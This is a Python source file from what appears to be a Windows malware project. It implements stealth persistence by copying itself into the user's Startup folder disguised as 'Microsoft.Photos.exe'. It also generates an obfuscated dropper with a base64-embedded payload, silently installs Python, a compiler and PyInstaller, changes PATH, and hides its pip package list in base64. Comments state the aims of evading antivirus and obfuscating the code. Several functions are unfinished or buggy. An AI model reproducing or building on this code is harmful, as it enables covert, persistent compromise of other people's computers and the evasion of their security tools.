import shutil
import subprocess
import os
import random
import base64
from Utils.helpers import is_os_64bit,random_string,run_pwsh,is_msvc_exist,download_file,extract_zip,get_current_file_path,base64_encode_file
from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
from .pyinstaller_obfuscate.main import obfuscate_files



def download_pyinstaller(download_path : str):
    """
    :param download_path: the assumed file name on the local system when downloaded
    we return False, or path to the extracted_file
    clean_path is the download_path --> but without the .zip suffix,
    so clean path is actually the extraction dir!
    """
    URL = "https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v4.7.zip"
    clean_path = download_path.replace('.zip','')
    if os.path.exists(download_path):
        os.remove(download_path)
    if os.path.exists(clean_path):
        shutil.rmtree(clean_path)
    if download_file(clean_path,URL):
        final_dir = clean_path.split('/')[::-1] #//TODO 1: check if this actually works!
        if extract_zip(f"c:/users/{os.getlogin()}/appdata/local/temp",clean_path):
            return f"c:/users/{os.getlogin()}/appdata/local/temp/{final_dir}"
    return False


def persist_in_startup():
    """no matter what we succeed to do just copy the current running exe to the startup folder
    //TODO 3: find another creative ways to persist in the FS and evade AV"""
    base64_of_ourself = base64_encode_file(get_current_file_path()) #str
    name_for_copy = "Microsoft.Photos.exe" #//TODO 2: add here names of unsigned files in windows with random.choice.
    startup_folder = f"c:/users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/{name_for_copy}"
    with open(startup_folder,'wb') as new_file:
        new_file.write(base64.b64decode(base64_of_ourself.encode())) #//TODO 4: Check if this working.
    return True



def create_dropper():
    """
    if we don't obfuscated pyinstaller, and we don't have admin rights
    we are gonna create a dropper with embedded base64 of our main exe.
    this dropper is kind'a in stupid way
    """
    current_file = get_current_file_path()
    obfuscated_base64_name = random_string(random.randrange(8,17))
    obfuscated_main_function = random_string(random.randrange(9,15))
    obfuscated_file_var = random_string(random.randrange(7,17))
    obfuscated_file_name = random_string(random.randrange(6,17))
    obfuscated_startup_folder = f"'c:/users/{os.getlogin()}/" \
                                f"appdata/roaming/microsoft/" \
                                f"windows/start menu/programs/startup/{obfuscated_file_name + '.exe'}'"
    backup_of_file = f"'c:/users/{os.getlogin()}/appdata/local/temp/{obfuscated_file_name + '.exe'}'"
    our_base64_file = f'"""{base64_encode_file(current_file)}"""'
    code = f"""
    from base64 import b64decode as {obfuscated_base64_name}
    from os import system
    our_code = {our_base64_file}
    def {obfuscated_main_function}():
        with open({obfuscated_startup_folder},'wb') as {obfuscated_file_var}:
            {obfuscated_file_var}.write({obfuscated_base64_name}(our_code))
        with open({backup_of_file},'wb') as {obfuscated_file_var}:
            {obfuscated_file_var},write({obfuscated_base64_name}(our_code))
        system({backup_of_file})
    main()
    """
    # //TODO: create the py file of the dropper, install it with py installer, and persist it.

def get_pyinstaller(pythonPath: str, admin=True):
    """
    :param str pythonPath: abs path to python.exe}
    :param bool admin: specify if we got admin permissions.
    //TODO 5: create 3 functions from this one. one for each condition.
    """
    PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/pyinstaller-4.7.zip"
    if not download_pyinstaller(PATH):
        # assume pyinstaller extracted in the PATH
        print("[*] Unknown error in extracting and downloading pyinstaller")
    if admin:
        if is_msvc_exist():
            if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/",python_path=pythonPath).obfuscate():
                pass
        else:
            gcc = "https://github.com/brechtsanders/winlibs_mingw/releases/download/11.2.0-9.0.0-msvcrt-r6/winlibs-x86_64-posix-seh-gcc-11.2.0-mingw-w64-9.0.0-r6.zip"
            PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/gcc.zip"
            GCC_EXTRACTION_PATH = "c:/MinGW"
            if os.path.exists(PATH):
               os.remove(PATH)
            if os.path.exists(GCC_EXTRACTION_PATH):
                shutil.rmtree(GCC_EXTRACTION_PATH)
            if download_file(path=PATH,URL=gcc):
                extract_zip(extracion_path=GCC_EXTRACTION_PATH,file_to_extract=PATH)
            os.system(r'setx PATH "C:\MinGW\mingw64\bin;%PATH%"')
            if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/",python_path=pythonPath).obfuscate():
                obfuscate_files(extraction_path=f"c:/users/{os.getlogin()}/appdata/local/temp/",name="test",base_path=f"c:/users/{os.getlogin()}/appdata/local/temp/try_this",pythonPath=pythonPath)
            #get gcc?
            pass
    #no admin
    if is_msvc_exist():
        #assume your are not admin, but pyinstaller exist and you have msvc
        #TODO 6:// detect other C COMPILERS
        return
    #IF WE GOT HERE. WE HAVE NO C COMPILERS AND NO ADMIN RIGHTS.
    # WE SHOULD JUST OBFUSCATE OUR CODE,AND USE PYINSTALLER TO INSTALL IT.

    pass
def pip_install(new_path=None):
    # base64 encode&decode all commands here on runtime, to prevent obfuscation from obfuscating the packages to install
    """
    :param new_path: new path for pytohn.exe (called new_path as we assume we installed python!)
    to_install is base64 encoded list of python packages to install with git
     //TODO 7: change new_path name and arch to something more obious
    """
    to_install = "Y3J5cHRvZ3JhcGh5IHRpbnlhZXMgbmV0aWZhY2VzIHJlcXVlc3RzIHBzdXRpbCBwYXRobGliMiB3aGVlbA=="
    if new_path:
        subprocess.run(
            f"{new_path} -m pip install --upgrade pip")
        subprocess.run(
            f"{new_path} -m pip install {base64.b64decode(to_install.encode()).decode()}")
        return 1
    subprocess.run(
        f"c:/users/{os.getlogin()}/appdata/local/programs/python/python38/python.exe -m pip install --upgrade pip")
    subprocess.run(
        f"c:/users/{os.getlogin()}/appdata/local/programs/python/python38/python.exe -m pip install {base64.b64decode(to_install.encode()).decode()}")
    return 1


def install_python():
    """
    this function gets called if we didn't find any python installed.
    we can install python with user and admin rights, here it's user only install!
    //TODO 8: check if user is admin (pass it as param), and if admin then install the python as admin
    //TODO 9: store urls in variables, strings are bad AF
    //TODO 10: we always return True. WTF? we should check if installation succeed and return bool by that.
    """
    url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1-amd64.exe" if is_os_64bit() else "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
    rand_py = f'python{random.randrange(111, 9999999)}.exe'
    d = run_pwsh(f"""iwr -Uri {url} -OutFile c:/users/$env:username/appdata/local/temp/{rand_py} """)
    if os.path.exists(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}"):
        subprocess.run(
            f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py} /quiet InstallAllUsers=0 Include_launcher=0 PrependPath=1 Include_test=0")
    os.remove(f"c:/users/{os.getlogin()}/appdata/local/temp/{rand_py}")
    pip_install()
    return True